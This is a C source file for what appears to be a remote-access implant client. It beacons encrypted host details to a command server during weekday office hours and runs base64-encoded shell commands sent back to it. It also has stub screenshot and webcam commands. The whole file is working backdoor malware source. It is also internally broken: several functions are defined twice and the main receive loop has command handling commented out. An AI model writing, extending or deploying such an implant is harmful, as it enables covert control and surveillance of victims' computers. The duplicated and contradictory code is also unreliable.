#include "client.h"

void log_it(const char* message) {
    if (LOGGING && log_file) {
        time_t now;
        time(&now);
        char* timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0'; // Remove newline
        fprintf(log_file, "[%s] %s\n", timestamp, message);
        fflush(log_file);
    }
}

char* get_session_id(const char* ip_address) {
    char* session_id = malloc(65); // SHA256 is 64 chars + null terminator
    if (!session_id) {
        return NULL;
    }

    unsigned char hash[SHA256_DIGEST_LENGTH];
    char data[256];
    int sum = 0;
    const char* ip_parts = strtok((char*)ip_address, ".");
    while (ip_parts != NULL) {
        sum += atoi(ip_parts);
        ip_parts = strtok(NULL, ".");
    }

    snprintf(data, sizeof(data), "%s<>%d", ip_address, sum);
    SHA256((unsigned char*)data, strlen(data), hash);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(&session_id[i*2], "%02x", hash[i]);
    }
    session_id[64] = '\0';

    return session_id;
}

char* encrypt_data(const char* data, const char* shared_key) {
    unsigned char salt[SALT_SIZE];
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
    unsigned char tag[TAG_SIZE];
    
    RAND_bytes(salt, SALT_SIZE);
    RAND_bytes(iv, IV_SIZE);

    if (PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_SIZE, 200000, EVP_sha512(), KEY_SIZE, key) != 1) {
        return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return NULL;

    int len;
    int ciphertext_len;
    int data_len = strlen(data);
    unsigned char *ciphertext = malloc(data_len + EVP_CIPHER_block_size(EVP_aes_256_gcm()));
    
    if (!ciphertext) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1 ||
        EVP_EncryptUpdate(ctx, ciphertext, &len, (unsigned char*)data, data_len) != 1 ||
        EVP_EncryptFinal_ex(ctx, ciphertext + len, &ciphertext_len) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag) != 1) {
        
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }

    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);

    char* result = malloc(4 * SALT_SIZE + 4 * IV_SIZE + 4 * TAG_SIZE + 4 * ciphertext_len + 4 + 1);
    if (!result) {
        free(ciphertext);
        return NULL;
    }

    char* pos = result;
    pos += EVP_EncodeBlock((unsigned char*)pos, salt, SALT_SIZE);
    *pos++ = ':';
    pos += EVP_EncodeBlock((unsigned char*)pos, iv, IV_SIZE);
    *pos++ = ':';
    pos += EVP_EncodeBlock((unsigned char*)pos, tag, TAG_SIZE);
    *pos++ = ':';
    pos += EVP_EncodeBlock((unsigned char*)pos, ciphertext, ciphertext_len);
    *pos = '\0';

    free(ciphertext);
    return result;
}

char* decrypt_data(const char* encrypted, const char* shared_key) {
    char* dup = strdup(encrypted);
    if (!dup) return NULL;

    char* salt_b64 = strtok(dup, ":");
    char* iv_b64 = strtok(NULL, ":");
    char* tag_b64 = strtok(NULL, ":");
    char* ciphertext_b64 = strtok(NULL, ":");

    if (!salt_b64 || !iv_b64 || !tag_b64 || !ciphertext_b64) {
        free(dup);
        return NULL;
    }

    unsigned char salt[SALT_SIZE], iv[IV_SIZE], tag[TAG_SIZE], key[KEY_SIZE];
    EVP_DecodeBlock(salt, (unsigned char*)salt_b64, strlen(salt_b64));
    EVP_DecodeBlock(iv, (unsigned char*)iv_b64, strlen(iv_b64));
    EVP_DecodeBlock(tag, (unsigned char*)tag_b64, strlen(tag_b64));

    if (PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_SIZE, 200000, EVP_sha512(), KEY_SIZE, key) != 1) {
        free(dup);
        return NULL;
    }

    int ciphertext_len = EVP_DecodeBlock(NULL, (unsigned char*)ciphertext_b64, strlen(ciphertext_b64));
    unsigned char* ciphertext = malloc(ciphertext_len);
    if (!ciphertext) {
        free(dup);
        return NULL;
    }
    EVP_DecodeBlock(ciphertext, (unsigned char*)ciphertext_b64, strlen(ciphertext_b64));

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(dup);
        free(ciphertext);
        return NULL;
    }

    int len;
    int plaintext_len;
    unsigned char *plaintext = malloc(ciphertext_len);
    if (!plaintext) {
        free(dup);
        free(ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1 ||
        EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_SIZE, tag) != 1 ||
        EVP_DecryptFinal_ex(ctx, plaintext + len, &plaintext_len) != 1) {
        
        EVP_CIPHER_CTX_free(ctx);
        free(dup);
        free(ciphertext);
        free(plaintext);
        return NULL;
    }

    plaintext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    free(dup);
    free(ciphertext);

    plaintext[plaintext_len] = '\0';
    return (char*)plaintext;
}

void send_command(const char* response) {
    char* encrypted = encrypt_data(response, SESSION_ID);
    if (strlen(encrypted) >= CHUNK_SIZE) {
        // Implement chunked sending
    } else {
        send(client_socket, encrypted, strlen(encrypted), 0);
        log_it("Sent Data");
    }
    free(encrypted);
}

void send_beacon() {
    char beacon[1024];
    snprintf(beacon, sizeof(beacon), 
             "{\"response\": {\"beacon\": true, \"version\": \"%s\", \"type\": \"%s\"}}",
             CVER, TYPE);
    send_command(beacon);
}

void sleep_ms(int milliseconds) {
    usleep(milliseconds * 1000);
}

// Function to get a retry interval
int get_retry_interval(int retries) {
    if (retries < sizeof(RETRY_INTERVALS) / sizeof(RETRY_INTERVALS[0])) {
        return RETRY_INTERVALS[retries];
    }
    return 0;
}

// Function to simulate JavaScript's sleep
void sleep_ms(int milliseconds) {
    struct timeval tv;
    tv.tv_sec = milliseconds / 1000;
    tv.tv_usec = (milliseconds % 1000) * 1000;
    select(0, NULL, NULL, NULL, &tv);
}

// Function to convert UTF-8 to UTF-16
unsigned short* utf8_to_utf16(const char* str) {
    int len = strlen(str);
    unsigned short* result = malloc((len + 1) * sizeof(unsigned short));
    if (!result) return NULL;

    int i, j;
    for (i = 0, j = 0; i < len; i++, j++) {
        unsigned char c = str[i];
        if (c < 128) {
            result[j] = c;
        } else {
            // This is a simplified conversion and doesn't handle all cases
            result[j] = (c & 0x1F) << 6 | (str[++i] & 0x3F);
        }
    }
    result[j] = 0;
    return result;
}

// Function to simulate setInterval for beacon
void* beacon_interval_thread(void* arg) {
    while (!exit_process) {
        sleep_ms(BEACON_MIN_INTERVAL + (rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)));
        
        time_t now;
        struct tm *tm_info;
        time(&now);
        tm_info = localtime(&now);
        
        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
        if (tm_info->tm_wday >= 1 && tm_info->tm_wday <= 5 && 
            tm_info->tm_hour >= 7 && tm_info->tm_hour <= 19) {
            send_beacon();
        }
    }
    return NULL;
}

// Function to start beacon interval thread
void start_beacon_interval() {
    pthread_t thread_id;
    pthread_create(&thread_id, NULL, beacon_interval_thread, NULL);
}

// Function to handle screenshot (placeholder)
void run_screenshot() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Screenshot functionality not implemented\"}}");
}

// Function to handle webcam (placeholder)
void run_webcam_clip() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Webcam functionality not implemented\"}}");
}

// Function to parse and execute action
void parse_action(const char* action) {
    char* action_copy = strdup(action);
    char* command = strtok(action_copy, " ");

    if (command == NULL) {
        send_command("{\"response\": {\"error\": \"No command provided\"}}");
        free(action_copy);
        return;
    }

    if (strcmp(command, "up") == 0) {
        get_uptime();
    } else if (strcmp(command, "di") == 0) {
        exit_process = 1;
        send_command("{\"response\": {\"data\": \"Disconnecting...\"}}");
    } else if (strcmp(command, "cmd") == 0 || strcmp(command, "ps") == 0) {
        char* payload = strtok(NULL, "");
        if (payload) {
            char* decoded_payload = malloc(strlen(payload));
            if (decoded_payload) {
                EVP_DecodeBlock((unsigned char*)decoded_payload, (const unsigned char*)payload, strlen(payload));
                char* result = run_command(decoded_payload);
                char response[1024 + strlen(result)];
                snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", result);
                send_command(response);
                free(result);
                free(decoded_payload);
            } else {
                send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
            }
        } else {
            send_command("{\"response\": {\"error\": \"No payload provided\"}}");
        }
    } else if (strcmp(command, "ss") == 0) {
        run_screenshot();
    } else if (strcmp(command, "wc") == 0) {
        run_webcam_clip();
    } else {
        char error_msg[100];
        snprintf(error_msg, sizeof(error_msg), "{\"response\": {\"error\": \"Unsupported command: %s\"}}", command);
        send_command(error_msg);
    }

    free(action_copy);
}

// Function to format file name
char* format_file_name(const char* name, const char* extension) {
    time_t now;
    struct tm *tm_info;
    char timestamp[20];
    char* file_name = malloc(100);  // Adjust size as needed

    if (!file_name) return NULL;

    time(&now);
    tm_info = localtime(&now);
    strftime(timestamp, 20, "%Y-%m-%d_%H-%M-%S", tm_info);

    snprintf(file_name, 100, "%s_%s.%s", name, timestamp, extension);
    return file_name;
}

// Function to format time
char* format_time(long milliseconds) {
    long total_seconds = milliseconds / 1000;
    int days = total_seconds / 86400;
    int hours = (total_seconds % 86400) / 3600;
    int minutes = (total_seconds % 3600) / 60;
    int seconds = total_seconds % 60;

    char* formatted_time = malloc(50);  // Adjust size as needed
    if (!formatted_time) return NULL;

    snprintf(formatted_time, 50, "%dd %dh %dm %ds", days, hours, minutes, seconds);
    return formatted_time;
}

// Function to get uptime
void get_uptime() {
    time_t current_time;
    time(&current_time);
    long uptime_millis = (long)(difftime(current_time, start_time) * 1000);
    char* uptime = format_time(uptime_millis);
    
    if (uptime) {
        char response[256];
        snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", uptime);
        send_command(response);
        free(uptime);
    } else {
        send_command("{\"response\": {\"error\": \"Failed to get uptime\"}}");
    }
}

// Function to run a command
char* run_command(const char* command) {
    FILE* fp;
    char* output = NULL;
    size_t output_size = 0;
    char buffer[128];

    fp = popen(command, "r");
    if (fp == NULL) {
        return strdup("Failed to run command");
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, output_size + len + 1);
        if (new_output == NULL) {
            free(output);
            pclose(fp);
            return strdup("Memory allocation failed");
        }
        output = new_output;
        strcpy(output + output_size, buffer);
        output_size += len;
    }

    pclose(fp);
    return output ? output : strdup("");
}

// Function to send beacon
void send_beacon() {
    struct utsname system_info;
    if (uname(&system_info) == -1) {
        log_it("Failed to get system information");
        return;
    }

    char beacon[1024];
    snprintf(beacon, sizeof(beacon), 
             "{\"response\": {"
             "\"beacon\": true, "
             "\"version\": \"%s\", "
             "\"type\": \"%s\", "
             "\"platform\": \"%s\", "
             "\"arch\": \"%s\", "
             "\"osver\": \"%s\", "
             "\"hostname\": \"%s\""
             "}}",
             CVER, TYPE, system_info.sysname, system_info.machine, 
             system_info.release, system_info.nodename);
    
    send_command(beacon);
}

// Function to handle connection and communication
void handle_connection() {
    char buffer[1024] = {0};
    while (!exit_process) {
        int valread = read(client_socket, buffer, 1024);
        if (valread > 0) {
            char* decrypted = decrypt_data(buffer, SESSION_ID);
            if (decrypted) {
                parse_action(decrypted);
                free(decrypted);
            }
            memset(buffer, 0, 1024);
        } else if (valread == 0) {
            log_it("Server disconnected");
            break;
        } else {
            log_it("Read error");
            break;
        }
    }
}

int connect_to_server() {
    struct sockaddr_in server_addr;
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) {
        log_it("Failed to create socket");
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_ADDRESS, &server_addr.sin_addr) <= 0) {
        log_it("Invalid address");
        return -1;
    }

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        log_it("Connection failed");
        return -1;
    }

    log_it("Connected to server");
    SESSION_ID = get_session_id(SERVER_ADDRESS);
    send_beacon();

    // Set up data receiving loop
    char buffer[1024] = {0};
    while (1) {
        int valread = read(client_socket, buffer, 1024);
        if (valread > 0) {
            char* decrypted = decrypt_data(buffer, SESSION_ID);
            // parse_action(decrypted);
            free(decrypted);
        }
    }

    return 0;
}

int main() {
    log_file = fopen("client.log", "a");
    if (!log_file) {
        fprintf(stderr, "Failed to open log file\n");
        return 1;
    }

    time(&start_time);
    
    while (!exit_process) {
        if (connect_to_server() < 0) {
            log_it("Failed to connect to server");
            sleep_ms(BEACON_MIN_INTERVAL);
        }
    }

    fclose(log_file);
    return 0;
}